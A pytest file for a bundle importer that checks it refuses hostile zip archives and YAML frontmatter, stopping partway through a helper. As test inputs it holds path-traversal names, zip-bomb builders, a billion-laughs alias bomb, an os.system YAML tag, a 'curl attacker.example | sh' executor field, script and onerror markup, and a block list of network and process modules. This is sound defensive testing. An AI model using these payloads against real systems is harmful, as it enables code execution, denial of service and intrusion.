"""R11-OKF03: hostile OKF bundles, one per limit, and the round-trip contract on the pure half.

Every limit in `aida.okf_import_bundle` has a named refusal, and every refusal has a test here
that builds the hostile archive or document and asserts its reason code. No database is needed:
the archive reader and the document comparison are pure, so a failure here points at a rule,
not at a fixture.

The archive-level refusals are checked before anything is decompressed or parsed where that is
the point (a member count that would cost memory, a name that would escape the bundle); the
decompression bounds are checked against the bytes actually produced, with headers that lie.
Nothing is ever fetched or executed: structurally (the modules import no network or process
facility) and behaviourally (the network and process launchers are patched to fail).
"""

from __future__ import annotations

import ast
import io
import json
import os
import socket
import stat
import struct
import subprocess
import time
import zipfile
from dataclasses import replace
from pathlib import Path
from typing import Any

import pytest

import aida.okf_import_bundle as bundle_module
from aida.okf_export import (
    DESCRIPTION_APPROVED,
    DESCRIPTION_WITHHELD,
    MANIFEST_FILENAME,
    OkfApproval,
    OkfBundle,
    OkfDefinitionFacts,
    OkfDescription,
    OkfSnapshot,
    bundle_archive_bytes,
    export_okf_bundle,
)
from aida.okf_import_bundle import (
    ARCHIVE_COMPRESSION_RATIO,
    ARCHIVE_CORRUPT,
    ARCHIVE_DUPLICATE_MEMBER,
    ARCHIVE_EXPANDS_TOO_LARGE,
    ARCHIVE_NOT_A_ZIP,
    ARCHIVE_SIZE_MISMATCH,
    ARCHIVE_TOO_LARGE,
    ARCHIVE_TOO_MANY_MEMBERS,
    ARCHIVE_ZIP64_NOT_SUPPORTED,
    BASE_TEXT_WITHHELD,
    BLANK_IS_NOT_A_DELETION,
    DOCUMENT_CONTROL_CHARACTERS,
    DOCUMENT_DERIVED,
    DOCUMENT_NOT_IN_SOURCE_BUNDLE,
    DUPLICATE_STABLE_ID,
    EDIT_COLUMN_DESCRIPTION,
    EDIT_CONCEPT_ALIASES,
    EDIT_CONCEPT_DEFINITION,
    EDIT_ROUTINE_PURPOSE,
    EDIT_TABLE_PURPOSE,
    ENCODING_INVALID,
    EXECUTABLE_FIELD_REFUSED,
    FAMILY_NOT_SUPPORTED,
    FAMILY_ROUTINE_DESCRIPTION,
    FIELD_DERIVED,
    FRONTMATTER_MISSING,
    FRONTMATTER_NOT_A_MAPPING,
    FRONTMATTER_TOO_LARGE,
    IDENTITY_MISMATCH,
    IMPORT_TOO_MANY_CHANGES,
    LINK_LIMIT_EXCEEDED,
    LINK_TOO_LONG,
    MANIFEST_INVALID,
    MANIFEST_MISSING,
    MEMBER_COMPRESSION_UNSUPPORTED,
    MEMBER_ENCRYPTED,
    MEMBER_NOT_ALLOWED,
    MEMBER_SPECIAL_FILE,
    MEMBER_SYMLINK,
    MEMBER_TOO_LARGE,
    OS_METADATA_IGNORED,
    OUTCOME_REFUSED,
    PATH_ABSOLUTE,
    PATH_TRAVERSAL,
    PATH_UNSAFE,
    SCHEMA_ROW_UNMATCHED,
    SECTION_DERIVED,
    SECTION_UNKNOWN,
    TEXT_CODE_FENCE_NOT_ALLOWED,
    TEXT_CONTROL_CHARACTERS,
    TEXT_HEADING_NOT_ALLOWED,
    TEXT_LINK_NOT_ALLOWED,
    TEXT_RAW_MARKUP_NOT_ALLOWED,
    TEXT_TOO_LONG,
    UNKNOWN_FIELD_TOLERATED,
    YAML_ALIAS_NOT_ALLOWED,
    YAML_DIRECTIVE_NOT_ALLOWED,
    YAML_DUPLICATE_KEY,
    YAML_INVALID,
    YAML_KEY_NOT_STRING,
    YAML_MULTIPLE_DOCUMENTS,
    YAML_SCALAR_TOO_LONG,
    YAML_TAG_NOT_ALLOWED,
    YAML_TOO_DEEP,
    YAML_TOO_MANY_NODES,
    OkfImportAnalysis,
    OkfImportRefused,
    _DocumentRefused,
    analyze_bundle_edits,
    load_frontmatter,
    read_import_archive,
    text_refusal,
)
from tests.test_okf_export import _snapshot

REPO_ROOT = Path(__file__).resolve().parents[1]
_MODULES = ("okf_import_bundle.py", "okf_import.py", "okf_import_api.py", "okf_import_review.py")


# --- builders -----------------------------------------------------------------------------


def _base() -> tuple[OkfSnapshot, OkfBundle, dict[str, str]]:
    snapshot = _snapshot()
    bundle = export_okf_bundle(snapshot)
    return snapshot, bundle, {document.path: document.text for document in bundle.documents}


def _path(texts: dict[str, str], marker: str) -> str:
    return next(path for path in texts if marker in path)


def _zip(
    members: list[tuple[str | zipfile.ZipInfo, bytes]],
    *,
    compression: int = zipfile.ZIP_DEFLATED,
) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=compression) as archive:
        for name, data in members:
            archive.writestr(name, data)
    return buffer.getvalue()


def _archive(texts: dict[str, str], manifest: str, **extra: bytes) -> bytes:
    members: list[tuple[str | zipfile.ZipInfo, bytes]] = [
        (f"bundle/{path}", text.encode("utf-8")) for path, text in texts.items()
    ]
    members.append((MANIFEST_FILENAME, manifest.encode("utf-8")))
    members.extend(extra.items())
    return _zip(members)


def _analyze(edits: dict[str, str | bytes]) -> OkfImportAnalysis:
    snapshot, bundle, texts = _base()
    members: list[tuple[str | zipfile.ZipInfo, bytes]] = []
    for path, text in {**texts, **edits}.items():
        data = text if isinstance(text, bytes) else text.encode("utf-8")
        members.append((f"bundle/{path}", data))
    members.append((MANIFEST_FILENAME, bundle.manifest_json().encode("utf-8")))
    archive = read_import_archive(_zip(members))
    return analyze_bundle_edits(archive, snapshot=snapshot, base_documents=texts)


def _refused(content: bytes) -> str:
    with pytest.raises(OkfImportRefused) as refused:
        read_import_archive(content)
    return refused.value.reason_code


def _document_refusals(analysis: OkfImportAnalysis) -> dict[str | None, str]:
    return {
        note.path: note.reason_code for note in analysis.notes if note.outcome == OUTCOME_REFUSED
    }


def _codes(analysis: OkfImportAnalysis) -> set[str]:
    return {note.reason_code for note in analysis.notes}


def _minimal(manifest: str = "{}") -> list[tuple[str | zipfile.ZipInfo, bytes]]:
    return [(MANIFEST_FILENAME, manifest.encode("utf-8"))]


def _set_central_flag(content: bytes, name: str, flag: int) -> bytes:
    """Set a member's general-purpose flag in its central-directory entry."""
    encoded = name.encode("utf-8")
    position = content.find(b"PK\x01\x02")
    while position >= 0:
        length = struct.unpack_from("<H", content, position + 28)[0]
        if content[position + 46 : position + 46 + length] == encoded:
            patched = bytearray(content)
            struct.pack_into("<H", patched, position + 8, flag)
            return bytes(patched)
        position = content.find(b"PK\x01\x02", position + 4)
    raise AssertionError(name)


def _set_sizes(content: bytes, name: str, size: int) -> bytes:
    """Rewrite a member's declared uncompressed size in both of its headers."""
    encoded = name.encode("utf-8")
    patched = bytearray(content)
    for signature, size_offset, name_offset in ((b"PK\x03\x04", 22, 30), (b"PK\x01\x02", 24, 46)):
        position = content.find(signature)
        while position >= 0:
            if content[position + name_offset : position + name_offset + len(encoded)] == encoded:
                struct.pack_into("<L", patched, position + size_offset, size)
            position = content.find(signature, position + 4)
    return bytes(patched)


# --- the archive ----------------------------------------------------------------------------


def test_an_oversized_archive_is_refused_before_it_is_parsed() -> None:
    with pytest.raises(OkfImportRefused) as refused:
        read_import_archive(b"\0" * (bundle_module.MAX_ARCHIVE_BYTES + 1))
    assert refused.value.reason_code == ARCHIVE_TOO_LARGE
    assert refused.value.status_code == 413


@pytest.mark.parametrize("content", [b"", b"not a zip", b"PK\x03\x04" + b"\0" * 64])
def test_something_that_is_not_a_zip_is_refused(content: bytes) -> None:
    assert _refused(content) == ARCHIVE_NOT_A_ZIP


def test_too_many_members_are_refused_from_the_central_directory(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(bundle_module, "MAX_ARCHIVE_MEMBERS", 5)
    members = _minimal() + [(f"bundle/doc-{index}.md", b"x") for index in range(9)]
    content = _zip(members)
    assert _refused(content) == ARCHIVE_TOO_MANY_MEMBERS
    # An end record that understates the count is caught by walking the directory itself.
    record = content.rfind(b"PK\x05\x06")
    lying = bytearray(content)
    struct.pack_into("<HH", lying, record + 8, 1, 1)
    assert _refused(bytes(lying)) == ARCHIVE_TOO_MANY_MEMBERS


def test_zip64_records_are_refused() -> None:
    content = bytearray(_zip(_minimal()))
    record = content.rfind(b"PK\x05\x06")
    struct.pack_into("<HH", content, record + 8, 0xFFFF, 0xFFFF)
    assert _refused(bytes(content)) == ARCHIVE_ZIP64_NOT_SUPPORTED


def test_a_zip_bomb_member_is_refused_by_its_compression_ratio() -> None:
    bomb = b"a" * (200 * 1024)
    assert _refused(_zip(_minimal() + [("bundle/index.md", bomb)])) == ARCHIVE_COMPRESSION_RATIO


def test_a_member_over_the_document_limit_is_refused_on_its_header() -> None:
    large = os.urandom(bundle_module.MAX_MEMBER_BYTES).hex().encode()
    assert _refused(_zip(_minimal() + [("bundle/index.md", large)])) == MEMBER_TOO_LARGE


def test_a_header_that_understates_a_size_is_refused_not_trusted() -> None:
    data = os.urandom(40 * 1024).hex().encode()
    content = _set_sizes(_zip(_minimal() + [("bundle/index.md", data)]), "bundle/index.md", 10)
    assert _refused(content) in (ARCHIVE_CORRUPT, ARCHIVE_SIZE_MISMATCH)


def test_the_total_expansion_is_bounded(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(bundle_module, "MAX_TOTAL_UNCOMPRESSED_BYTES", 10_000)
    members = _minimal() + [
        (f"bundle/doc-{index}.md", os.urandom(2_000).hex().encode()) for index in range(4)
    ]
    assert _refused(_zip(members)) == ARCHIVE_EXPANDS_TOO_LARGE


@pytest.mark.parametrize(
    ("name", "reason"),
    [
        ("bundle/../../etc/passwd.md", PATH_TRAVERSAL),
        ("../outside.md", PATH_TRAVERSAL),
        ("/bundle/index.md", PATH_ABSOLUTE),
        ("C:/bundle/index.md", PATH_ABSOLUTE),
        ("bundle//index.md", PATH_UNSAFE),
        ("bundle/./index.md", PATH_UNSAFE),
    ],
)
def test_a_name_that_escapes_the_bundle_is_refused(name: str, reason: str) -> None:
    assert _refused(_zip(_minimal() + [(zipfile.ZipInfo(name), b"x")])) == reason


@pytest.mark.parametrize("hostile", ["bundle\\aa\\x.md", "bundle/aa\x00x.md"])
def test_a_backslash_or_nul_in_a_raw_name_is_refused(hostile: str) -> None:
    """`zipfile` rewrites a backslash (on Windows) and cuts at a NUL, so both are planted in
    the raw bytes and read back from the name as the archive spelled it."""
    planted = "bundle/aa/x.md"
    assert len(planted) == len(hostile)
    content = _zip(_minimal() + [(planted, b"x")]).replace(planted.encode(), hostile.encode())
    assert _refused(content) == PATH_UNSAFE


@pytest.mark.parametrize(
    ("mode", "reason"),
    [
        (stat.S_IFLNK | 0o777, MEMBER_SYMLINK),
        (stat.S_IFCHR | 0o644, MEMBER_SPECIAL_FILE),
        (stat.S_IFBLK | 0o644, MEMBER_SPECIAL_FILE),
        (stat.S_IFIFO | 0o644, MEMBER_SPECIAL_FILE),
        (stat.S_IFSOCK | 0o644, MEMBER_SPECIAL_FILE),
    ],
)
def test_links_and_device_files_are_refused(mode: int, reason: str) -> None:
    info = zipfile.ZipInfo("bundle/index.md")
    info.external_attr = mode << 16
    assert _refused(_zip(_minimal() + [(info, b"/etc/passwd")])) == reason


def test_an_encrypted_member_is_refused() -> None:
    plain = _zip(_minimal() + [("bundle/index.md", b"x")])
    assert _refused(_set_central_flag(plain, "bundle/index.md", 1)) == MEMBER_ENCRYPTED


def test_an_unexpected_compression_method_is_refused() -> None:
    content = _zip(_minimal() + [("bundle/index.md", b"x" * 100)], compression=zipfile.ZIP_BZIP2)
    assert _refused(content) == MEMBER_COMPRESSION_UNSUPPORTED


@pytest.mark.parametrize(
    "name",
    [
        "bundle/run.sh",
        "payload.exe",
        "bundle/inner.zip",
        "bundle/Index.md",
        "other/index.md",
        "bundle/sources/Source-1/index.md",
    ],
)
def test_a_member_atlas_never_exports_is_refused(name: str) -> None:
    assert _refused(_zip(_minimal() + [(name, b"x")])) == MEMBER_NOT_ALLOWED


def test_duplicate_member_names_are_refused() -> None:
    with pytest.warns(UserWarning):
        content = _zip(_minimal() + [("bundle/index.md", b"a"), ("bundle/index.md", b"b")])
    assert _refused(content) == ARCHIVE_DUPLICATE_MEMBER


@pytest.mark.parametrize(
    ("manifest", "reason"),
    [
        (None, MANIFEST_MISSING),
        ("{not json", MANIFEST_INVALID),
        ('{"a": 1, "a": 2}', MANIFEST_INVALID),
        ("[" * 100_000 + "]" * 100_000, MANIFEST_INVALID),
        ("[1, 2]", MANIFEST_INVALID),
    ],
    ids=["missing", "not-json", "duplicate-key", "nesting-bomb", "not-an-object"],
)
def test_the_manifest_is_required_and_parsed_strictly(manifest: str | None, reason: str) -> None:
    members: list[tuple[str | zipfile.ZipInfo, bytes]] = [("bundle/index.md", b"# x\n")]
    if manifest is not None:
        members.append((MANIFEST_FILENAME, manifest.encode()))
    # Stored, so the nesting bomb reaches the JSON parser instead of the ratio check.
    assert _refused(_zip(members, compression=zipfile.ZIP_STORED)) == reason


def test_operating_system_metadata_is_skipped_and_listed() -> None:
    _snapshot_value, bundle, texts = _base()
    content = _archive(
        texts,
        bundle.manifest_json(),
        **{"__MACOSX/bundle/._index.md": b"\x00\x05", "bundle/.DS_Store": b"\x00\x01"},
    )
    archive = read_import_archive(content)
    assert archive.ignored_members == 2
    analysis = analyze_bundle_edits(archive, snapshot=_snapshot_value, base_documents=texts)
    assert OS_METADATA_IGNORED in _codes(analysis)


def test_an_exported_bundle_reads_back_unchanged_without_parsing_a_document(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    snapshot, bundle, texts = _base()

    def refuse(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("an unchanged document must not be parsed")

    monkeypatch.setattr(bundle_module, "load_frontmatter", refuse)
    archive = read_import_archive(bundle_archive_bytes(bundle))
    analysis = analyze_bundle_edits(archive, snapshot=snapshot, base_documents=texts)
    assert (analysis.changed, analysis.edits, analysis.notes) == (0, (), ())
    assert analysis.unchanged == len(texts)


# --- one document ---------------------------------------------------------------------------


def test_invalid_utf8_and_control_characters_refuse_only_that_document() -> None:
    _snapshot_value, _bundle, texts = _base()
    table = _path(texts, "/tables/")
    concept = _path(texts, "concepts/concept-")
    analysis = _analyze(
        {
            table: texts[table].encode("utf-8").replace(b"One row", b"One \xff row"),
            concept: texts[concept].replace("A confirmed", "A \x07confirmed"),
        }
    )
    refusals = _document_refusals(analysis)
    assert refusals[table] == ENCODING_INVALID
    assert refusals[concept] == DOCUMENT_CONTROL_CHARACTERS
    assert analysis.edits == ()


_BILLION_LAUGHS = "\n".join(
    [
        'a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]',
        *(
            f"{chr(98 + index)}: &{chr(98 + index)} [{','.join(['*' + chr(97 + index)] * 9)}]"
            for index in range(8)
        ),
        "type: Atlas Table",
    ]
)


@pytest.mark.parametrize(
    ("raw", "reason"),
    [
        (_BILLION_LAUGHS, YAML_ALIAS_NOT_ALLOWED),
        ("base: &base {type: x}\nother:\n  <<: *base", YAML_ALIAS_NOT_ALLOWED),
        ("type: !!python/object/apply:os.system ['echo pwned']", YAML_TAG_NOT_ALLOWED),
        ("type: !include /etc/passwd", YAML_TAG_NOT_ALLOWED),
        ("type: !!str Atlas Table", YAML_TAG_NOT_ALLOWED),
        ("%TAG !e! tag:example.com,2000:\n---\ntype: !e!x y", YAML_DIRECTIVE_NOT_ALLOWED),
        ("a: 1\n--- \nb: 2", YAML_MULTIPLE_DOCUMENTS),
        ("a:\n" + "".join("  " * depth + "k:\n" for depth in range(1, 40)), YAML_TOO_DEEP),
        ("a: [" + ",".join(["1"] * 9_000) + "]", YAML_TOO_MANY_NODES),
        ("a: '" + "x" * 17_000 + "'", YAML_SCALAR_TOO_LONG),
        ("type: a\ntype: b", YAML_DUPLICATE_KEY),
        ("1: x", YAML_KEY_NOT_STRING),
        ("[a, b]", FRONTMATTER_NOT_A_MAPPING),
        ("a: [unclosed", YAML_INVALID),
        ("a: '" + "x" * 40_000 + "'", FRONTMATTER_TOO_LARGE),
    ],
    ids=[
        "billion-laughs",
        "merge-key-alias",
        "python-tag",
        "custom-tag",
        "core-tag",
        "tag-directive",
        "two-documents",
        "deep",
        "many-nodes",
        "long-scalar",
        "duplicate-key",
        "integer-key",
        "sequence",
        "unparseable",
        "oversized",
    ],
)
def test_frontmatter_is_loaded_safely_and_bounded(
    raw: str, reason: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    def never(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("imported YAML must never run anything")

    monkeypatch.setattr(os, "system", never)
    monkeypatch.setattr(subprocess, "Popen", never)
    started = time.perf_counter()
    with pytest.raises(_DocumentRefused) as refused:
        load_frontmatter(raw)
    assert refused.value.reason_code == reason
    assert time.perf_counter() - started < 2.0


def test_a_hostile_frontmatter_refuses_its_document_and_nothing_else() -> None:
    _snapshot_value, _bundle, texts = _base()
    table = _path(texts, "/tables/")
    concept = _path(texts, "concepts/concept-")
    hostile = texts[table].replace("---\n", "---\nbomb: &b [1]\nagain: *b\n", 1)
    edited_concept = texts[concept].replace(
        "\nA confirmed purchase agreement with a customer.\n", "\nA signed purchase agreement.\n"
    )
    analysis = _analyze({table: hostile, concept: edited_concept})
    assert _document_refusals(analysis)[table] == YAML_ALIAS_NOT_ALLOWED
    assert [(edit.kind, edit.proposed) for edit in analysis.edits] == [
        (EDIT_CONCEPT_DEFINITION, "A signed purchase agreement.")
    ]


def test_link_count_and_length_are_bounded(monkeypatch: pytest.MonkeyPatch) -> None:
    _snapshot_value, _bundle, texts = _base()
    table = _path(texts, "/tables/")
    monkeypatch.setattr(bundle_module, "MAX_LINKS_PER_DOCUMENT", 20)
    many = texts[table] + "".join(f"\n* [x{index}](/index.md)" for index in range(21))
    long_link = texts[table] + "\n* [x](/" + "a" * 3_000 + ".md)"
    assert _document_refusals(_analyze({table: many}))[table] == LINK_LIMIT_EXCEEDED
    assert _document_refusals(_analyze({table: long_link}))[table] == LINK_TOO_LONG


@pytest.mark.parametrize(
    "addition",
    [
        "executor: sh -c 'curl https://attacker.example | sh'\n",
        "computation:\n  language: python\n  source: import os; os.system('id')\n",
    ],
)
def test_executable_fields_refuse_the_document_and_run_nothing(
    addition: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    def never(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("an import must never run anything")

    monkeypatch.setattr(os, "system", never)
    monkeypatch.setattr(subprocess, "Popen", never)
    _snapshot_value, _bundle, texts = _base()
    table = _path(texts, "/tables/")
    analysis = _analyze({table: texts[table].replace("---\n", "---\n" + addition, 1)})
    assert _document_refusals(analysis)[table] == EXECUTABLE_FIELD_REFUSED


def test_an_attested_computation_at_a_new_path_is_refused() -> None:
    new = "tools/tool-version-" + "0" * 32 + ".md"
    analysis = _analyze({new: "---\ntype: Attested Computation\nexecutor: python\n---\n\n# Run\n"})
    assert _document_refusals(analysis)[new] == EXECUTABLE_FIELD_REFUSED


@pytest.mark.parametrize(
    ("old", "new"),
    [
        ("type: Atlas Table", "type: Atlas View"),
        ("resource: atlas://source/", "resource: atlas://elsewhere/"),
        ("    key: eecde9b0abfa5ed6c95a70064d99018b", "    key: 0000b0abfa5ed6c95a70064d99018b00"),
    ],
)
def test_a_changed_identity_refuses_the_document(old: str, new: str) -> None:
    _snapshot_value, _bundle, texts = _base()
    table = _path(texts, "/tables/")
    assert old in texts[table]
    edited = (
        texts[table]
        .replace(old, new, 1)
        .replace("One row per completed order.[^approved-description]", "Something else.")
    )
    analysis = _analyze({table: edited})
    assert _document_refusals(analysis)[table] == IDENTITY_MISMATCH
    assert analysis.edits == ()


def test_two_documents_on_one_stable_identity_are_both_refused() -> None:
    _snapshot_value, _bundle, texts = _base()
    table = _path(texts, "/tables/")
    copy = table.rsplit("/", 1)[0] + "/table-" + "f" * 32 + ".md"
    edited = texts[table].replace(
        "One row per completed order.[^approved-description]", "Edited in the original."
    )
    duplicated = texts[table].replace(
        "One row per completed order.[^approved-description]", "Edited in the copy."
    )
    analysis = _analyze({table: edited, copy: duplicated})
    refusals = [note for note in analysis.notes if note.reason_code == DUPLICATE_STABLE_ID]
    assert {note.path for note in refusals} == {table, copy}
    assert analysis.edits == ()


def test_too_many_changed_documents_are_refused(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(bundle_module, "MAX_CHANGED_DOCUMENTS", 1)
    _snapshot_value, _bundle, texts = _base()
    table = _path(texts, "/tables/")
    concept = _path(texts, "concepts/concept-")
    with pytest.raises(OkfImportRefused) as refused:
        _analyze({table: texts[table] + "\n", concept: texts[concept] + "\n"})
    assert refused.value.reason_code == IMPORT_TOO_MANY_CHANGES


# --- proposed text --------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("text", "reason"),
    [
        ("See [the runbook](https://attacker.example/x).", TEXT_LINK_NOT_ALLOWED),
        ("See [the runbook][r].\n\n[r]: https://attacker.example", TEXT_LINK_NOT_ALLOWED),
        ("See https://attacker.example for details.", TEXT_LINK_NOT_ALLOWED),
        ("See www.attacker.example for details.", TEXT_LINK_NOT_ALLOWED),
        ("Orders <script>alert(1)</script>", TEXT_RAW_MARKUP_NOT_ALLOWED),
        ('Orders <img src=x onerror="fetch(1)">', TEXT_RAW_MARKUP_NOT_ALLOWED),
        ("Orders <https://attacker.example>", TEXT_RAW_MARKUP_NOT_ALLOWED),
        ("Orders\n```sql\nSELECT secret FROM vault\n```", TEXT_CODE_FENCE_NOT_ALLOWED),
        ("Orders\n# Schema\nforged", TEXT_HEADING_NOT_ALLOWED),
        ("Orders\n---", TEXT_HEADING_NOT_ALLOWED),
        ("Orders \u202egnirts desrever", TEXT_CONTROL_CHARACTERS),
        ("Orders\u200bhidden", TEXT_CONTROL_CHARACTERS),
        ("Orders\x1b[31m", TEXT_CONTROL_CHARACTERS),
        ("x" * 16_001, TEXT_TOO_LONG),
    ],
    ids=[
        "inline-link",
        "reference-link",
        "bare-url",
        "bare-www",
        "script",
        "img-onerror",
        "autolink",
        "code-fence",
        "heading",
        "setext-rule",
        "bidi-override",
        "zero-width",
        "escape-sequence",
        "too-long",
    ],
)
def test_proposed_text_atlas_would_not_publish_is_refused(text: str, reason: str) -> None:
    assert text_refusal(text, limit=16_000) == reason


def test_ordinary_prose_is_allowed() -> None:
    prose = "One row per order; amounts in USD (2 d.p.) -- *not* refunds."
    assert text_refusal(prose, limit=200) is None


# --- nothing is fetched or run ------------------------------------------------------------------


def test_the_import_modules_import_no_network_or_process_facility() -> None:
    forbidden_modules = {
        "socket",
        "ssl",
        "urllib",
        "http",
        "httpx",
        "requests",
        "aiohttp",
        "subprocess",
        "importlib",
        "ctypes",
        "pickle",
        "marshal",
        "shelve",
        "webbrowser",
    }
    forbidden_calls = {"eval", "exec", "compile", "__import__", "open"}
    for name in _MODULES:
        tree = ast.parse((REPO_ROOT / "src" / "aida" / name).read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                roots = {alias.name.split(".")[0] for alias in node.names}
            elif isinstance(node, ast.ImportFrom):
                roots = {(node.module or "").split(".")[0]}
            else:
                roots = set()
            assert not roots & forbidden_modules, (name, roots)
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
                assert node.func.id not in forbidden_calls, (name, node.func.id)


def test_a_bundle_full_of_external_links_is_read_with_the_network_disabled(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def offline(*_args: Any, **_kwargs: Any) -> Any:
        raise AssertionError("an import must never open a connection")

    monkeypatch.setattr(socket.socket, "connect", offline)
    monkeypatch.setattr(socket, "getaddrinfo", offline)
    monkeypatch.setattr(socket, "create_connection", offline)
    _snapshot_value, _bundle, texts = _base()
    table = _path(texts, "/tables/")
    linked = (
        texts[table].replace("---\n", "---\nhomepage: https://attacker.example/beacon\n", 1)
        + "\n* [beacon](https://attacker.example/x.png)\n![img](http://attacker.example/i.png)\n"
    )
    analysis = _analyze({table: linked})
    assert UNKNOWN_FIELD_TOLERATED in _codes(analysis)


# --- the round-trip contract, on the pure half ------------------------------------------------


def test_supported_edits_become_edits_in_their_families() -> None:
    _snapshot_value, _bundle, texts = _base()
    table = _path(texts, "/tables/")
    concept = _path(texts, "concepts/concept-")
    analysis = _analyze(
        {
            table: texts[table]
            .replace("One row per completed order.[^approved-description]", "One row per order.")
            .replace("| The order's identifier. |", "| The order's unique identifier. |"),
            concept: texts[concept]
            .replace(
                "\nA confirmed purchase agreement with a customer.\n",
                "\nA signed purchase agreement.\n",
            )
            .replace(
                "# Mapped objects", "# Also called\n\n* sale \\[signed\\]\n\n# Mapped objects"
            ),
        }
    )
    by_kind = {edit.kind: edit for edit in analysis.edits}
    assert by_kind[EDIT_TABLE_PURPOSE].proposed == "One row per order."
    assert by_kind[EDIT_TABLE_PURPOSE].base_version == 3
    assert by_kind[EDIT_COLUMN_DESCRIPTION].proposed == "The order's unique identifier."
    assert by_kind[EDIT_COLUMN_DESCRIPTION].column_name == "order_id"
    assert by_kind[EDIT_COLUMN_DESCRIPTION].base_version == 1
    assert by_kind[EDIT_CONCEPT_DEFINITION].proposed == "A signed purchase agreement."
    assert by_kind[EDIT_CONCEPT_ALIASES].added_aliases == ("sale [signed]",)


def test_unsupported_and_derived_changes_are_listed_not_dropped() -> None:
    _snapshot_value, _bundle, texts = _base()
    table = _path(texts, "/tables/")
    routine = _path(texts, "/routines/")
    package = _path(texts, "/packages/")
    new = "concepts/concept-" + "a" * 32 + ".md"
    analysis = _analyze(
        {
            "index.md": texts["index.md"] + "\nAn edit to an index.\n",
            # A routine's interface is catalog fact, re-derived: SECTION_DERIVED, not an edit.
            routine: texts[routine].replace("# Interface", "# Interface\n\nEdited.", 1),
            # A package has no description family at all: FAMILY_NOT_SUPPORTED.
            package: texts[package].replace(
                "Not established. No approved description of this package exists.",
                "Risk calculations for the sales ledger.",
            ),
            new: "---\ntype: Atlas Business Concept\n---\n\n# Definition\n\nNew.\n",
            table: texts[table]
            .replace("One row per completed order.[^approved-description]", "")
            .replace("* Columns captured: 1.", "* Columns captured: 99.")
            .replace("| `order_id` | `uuid` |", "| `order_id` | `text` |")
            .replace("title: bank.sales.orders", "title: bank.sales.renamed")
            + "\n# Wiki notes\n\nNot imported.\n"
            + "\n| `ghost` | `int` | no | INTERNAL | A column nobody exported. |\n",
        }
    )
    codes = _codes(analysis)
    for expected in (
        DOCUMENT_DERIVED,
        FAMILY_NOT_SUPPORTED,
        DOCUMENT_NOT_IN_SOURCE_BUNDLE,
        BLANK_IS_NOT_A_DELETION,
        SECTION_DERIVED,
        SECTION_UNKNOWN,
        FIELD_DERIVED,
    ):
        assert expected in codes, expected
    assert analysis.edits == ()


def test_a_schema_row_nobody_exported_is_listed_and_a_struck_alias_is_proposed() -> None:
    """R11-OKF03, decided 2026-09-25: striking an alias from a list that keeps entries is a
    removal proposed for review; the unmatched schema row is still only listed."""
    snapshot, _bundle, _texts = _base()
    concept = replace(snapshot.concepts[0], aliases=("deal", "purchase"))
    snapshot = replace(snapshot, concepts=(concept,))
    bundle = export_okf_bundle(snapshot)
    texts = {document.path: document.text for document in bundle.documents}
    table = _path(texts, "/tables/")
    concept_path = _path(texts, "concepts/concept-")
    edited = {
        table: texts[table].replace(
            "| `order_id` | `uuid` | no | INTERNAL | The order's identifier. |",
            "| `order_id` | `uuid` | no | INTERNAL | The order's identifier. |\n"
            "| `ghost` | `int` | no | INTERNAL | Invented. |",
        ),
        concept_path: texts[concept_path].replace("* purchase\n", ""),
    }
    members: list[tuple[str | zipfile.ZipInfo, bytes]] = [
        (f"bundle/{path}", text.encode()) for path, text in {**texts, **edited}.items()
    ]
    members.append((MANIFEST_FILENAME, bundle.manifest_json().encode()))
    analysis = analyze_bundle_edits(
        read_import_archive(_zip(members)), snapshot=snapshot, base_documents=texts
    )
    codes = _codes(analysis)
    assert SCHEMA_ROW_UNMATCHED in codes
    [edit] = analysis.edits
    assert edit.kind == EDIT_CONCEPT_ALIASES
    assert edit.removed_aliases == ("purchase",) and edit.added_aliases == ()


def test_an_emptied_alias_list_is_blank_and_removes_nothing() -> None:
    snapshot, _bundle, _texts = _base()
    concept = replace(snapshot.concepts[0], aliases=("deal", "purchase"))
    snapshot = replace(snapshot, concepts=(concept,))
    bundle = export_okf_bundle(snapshot)
    texts = {document.path: document.text for document in bundle.documents}
    concept_path = _path(texts, "concepts/concept-")
    edited = {concept_path: texts[concept_path].replace("* deal\n", "").replace("* purchase\n", "")}
    members: list[tuple[str | zipfile.ZipInfo, bytes]] = [
        (f"bundle/{path}", text.encode()) for path, text in {**texts, **edited}.items()
    ]
    members.append((MANIFEST_FILENAME, bundle.manifest_json().encode()))
    analysis = analyze_bundle_edits(
        read_import_archive(_zip(members)), snapshot=snapshot, base_documents=texts
    )
    assert BLANK_IS_NOT_A_DELETION in _codes(analysis)
    assert analysis.edits == ()


def test_an_edit_to_withheld_text_is_not_proposed() -> None:
    snapshot, _bundle, _texts = _base()
    orders = snapshot.objects[0]
    withheld = replace(
        orders,
        description=OkfDescription(
            state=DESCRIPTION_WITHHELD, version=3, withheld_reason_codes=("EGRESS_SCREENING",)
        ),
    )
    snapshot = replace(snapshot, objects=(withheld, *snapshot.objects[1:]))
    bundle = export_okf_bundle(snapshot)
    texts = {document.path: document.text for document in bundle.documents}
    table = _path(texts, "/tables/")
    start = texts[table].index("Withheld.")
    end = texts[table].index("\n", start)
    edited = texts[table][:start] + "A description written blind." + texts[table][end:]
    members: list[tuple[str | zipfile.ZipInfo, bytes]] = [
        (f"bundle/{path}", text.encode()) for path, text in {**texts, table: edited}.items()
    ]
    members.append((MANIFEST_FILENAME, bundle.manifest_json().encode()))
    analysis = analyze_bundle_edits(
        read_import_archive(_zip(members)), snapshot=snapshot, base_documents=texts
    )
    assert BASE_TEXT_WITHHELD in _codes(analysis)
    assert analysis.edits == ()


def _routine_analysis(
    snapshot: OkfSnapshot, edit: Any
) -> tuple[OkfImportAnalysis, str, dict[str, str]]:
